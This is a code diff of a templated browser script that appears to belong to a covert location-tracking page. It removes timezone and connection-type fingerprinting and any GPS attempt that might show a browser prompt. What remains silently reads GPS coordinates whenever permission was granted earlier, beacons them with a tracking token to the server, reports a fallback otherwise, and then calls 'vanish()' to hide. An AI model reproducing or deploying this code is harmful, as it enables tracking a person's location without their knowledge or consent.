@@ -22,18 +22,6 @@
     return;
   {% endif %}
 
-  function getTimezone() {
-    try { return Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e) { return null; }
-  }
-
-  function getConnType() {
-    try {
-      var c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-      if (c) return c.effectiveType || c.type || null;
-    } catch(e) {}
-    return null;
-  }
-
   function sendCoords(lat, lng, acc) {
     if (_sent) return;
     _sent = true;
@@ -41,9 +29,7 @@
       token: token,
       latitude: lat,
       longitude: lng,
-      accuracy: acc,
-      connectionType: getConnType(),
-      timezone: getTimezone()
+      accuracy: acc
     });
     var blob = new Blob([payload], { type: 'application/json' });
     if (navigator.sendBeacon) {
@@ -56,17 +42,12 @@
   function sendFallback() {
     if (_sent) return;
     _sent = true;
-    var payload = JSON.stringify({
-      token: token,
-      connectionType: getConnType(),
-      timezone: getTimezone()
-    });
-    var blob = new Blob([payload], { type: 'application/json' });
-    if (navigator.sendBeacon) {
-      navigator.sendBeacon('/api/location-denied', blob);
-    } else {
-      try { fetch('/api/location-denied', { method:'POST', headers:{'Content-Type':'application/json'}, body:payload, keepalive:true }); } catch(e) {}
-    }
+    fetch('/api/location-denied', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ token: token }),
+      keepalive: true
+    }).catch(function(){});
   }
 
   function vanish() {
@@ -84,9 +65,7 @@
   }
 
   // ── Permission-aware GPS attempt ──
-  // Query permission FIRST — never triggers a prompt
-  // granted: GPS fires silently
-  // denied/prompt: silently fall back to IP, never prompt the user
+  // Only fires if permission already granted — never triggers a prompt
   if (navigator.permissions && navigator.permissions.query) {
     navigator.permissions.query({ name: 'geolocation' }).then(function(status) {
       if (status.state === 'granted' && 'geolocation' in navigator) {
@@ -105,40 +84,18 @@
           if (!_sent) { sendFallback(); vanish(); }
         }, 10000);
       } else {
-        // denied or prompt — never trigger the browser prompt
         sendFallback();
         vanish();
       }
     }).catch(function() {
-      // Permissions API unavailable — try GPS anyway (may prompt on some browsers)
-      if ('geolocation' in navigator) {
-        navigator.geolocation.getCurrentPosition(
-          function(pos) { sendCoords(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy); vanish(); },
-          function() { sendFallback(); vanish(); },
-          { enableHighAccuracy: true, timeout: 8000, maximumAge: 300000 }
-        );
-        setTimeout(function() { if (!_sent) { sendFallback(); vanish(); } }, 10000);
-      } else {
-        sendFallback();
-        vanish();
-      }
-    });
-  } else {
-    // No Permissions API — try GPS (Chrome without gesture → silent error, Safari → may prompt)
-    if ('geolocation' in navigator) {
-      navigator.geolocation.getCurrentPosition(
-        function(pos) { sendCoords(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy); vanish(); },
-        function() { sendFallback(); vanish(); },
-        { enableHighAccuracy: true, timeout: 8000, maximumAge: 300000 }
-      );
-      setTimeout(function() { if (!_sent) { sendFallback(); vanish(); } }, 10000);
-    } else {
       sendFallback();
       vanish();
-    }
+    });
+  } else {
+    sendFallback();
+    vanish();
   }
 
-  // Hard timeout — vanish after 4s regardless
   setTimeout(function() {
     if (!_sent) { sendFallback(); }
     vanish();
